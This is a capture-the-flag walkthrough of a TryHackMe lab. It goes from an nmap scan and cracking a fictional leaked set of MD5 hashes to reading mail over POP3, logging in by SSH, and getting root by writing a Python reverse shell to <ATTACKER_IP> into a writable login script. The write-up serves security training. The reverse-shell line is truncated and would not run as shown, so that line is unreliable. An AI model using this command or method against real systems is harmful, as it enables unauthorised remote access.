# PownSniff CTF Walkthrough
<br/>

## Intro
Welcome to the PownSniff challenge, here is the link to the [room](https://tryhackme.com/room/ctf) on TryHackMe.

This challenge is about leaked credentials, password cracking an reverse shells...

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
Let's add the domain to the hosts file:
```bash
echo "MACHINE_IP pownsniff.thm" | sudo tee -a /etc/hosts
```

nmap scan:
```bash
nmap -sV -sC 10.10.144.58 
```

We get 4 open ports:
```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Fowsniff Corp - Delivering Solutions
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: CAPA AUTH-RESP-CODE SASL(PLAIN) TOP PIPELINING USER RESP-CODES UIDL
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: Pre-login have more LITERAL+ listed LOGIN-REFERRALS post-login capabilities OK IMAP4rev1 ENABLE IDLE AUTH=PLAINA0001 SASL-IR ID
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's visit their website `http://pownsniff.thm`.
Here we can find the org name: Fowsniff' and read that the company just had a data breach, let's serach online for leaked data.

Googling we can find this GitHub page https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt, containing:
```
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
 
 
REDACTED-FOR-THE-WRITEUP
 
B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

--- THIS IS NOT A REAL PASSWORD LEAK ---
 
All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.
 
Any similarities to actual people or entities is purely coincidental and occurred accidentally.
```

Here we can see a series of usernames and password hashed.
Let's see which hash fromat it is:
```bash
nth --text "REDACTED"
```

So we have a bunch of MD5 hashes, put them in a file and crack them, you can use *crackstation* online as md5 hashes are easy.

Now let's login to the POP3 server as seina:
```bash
telnet 10.10.113.150 110
```
```
USER seina
PASS scoobydoo2
```

Now list messages:
```
LIST
```

Get the first message:
```
RETR 1
```

The mail, sent by the user "baksteen" talks about a security incident and there is a new password inside:
```
The temporary password for SSH is "REDACTED"
```

Now we can login with SSH:
```bash
ssh baksteen@pownsniff.thm
```

Let's check the groups in which the user is in:
```bash
groups baksteen
```

He is part of the `users` group.

Now we need a file that is writable and that can be run by that group, the hint tells us is called `cube.sh`:
```bash
find / -name cube.sh
```

The file is located here: `/opt/cube/cube.sh`, let's edit it:
```bash
nano /opt/cube/cube.sh
```

Now we want a listener ready on our machine:
```bash
nc -lvnp 1234
```

Copy this code for a reverse-shell on that file:
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<ATTACKER_IP>,1234));os.dup2(s.fileno(),0);
```

This file contains the ASCII art tht we have seen when we logged in via SSH, this means that it  is probaly called upon SSH login

Now log out and login back to SSH, you should get a reverse shell as root!

<br/>
<br/>

## Conclusion
Congratulations you have successfully found the leaked password, craked the hashes and gained access to the target.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
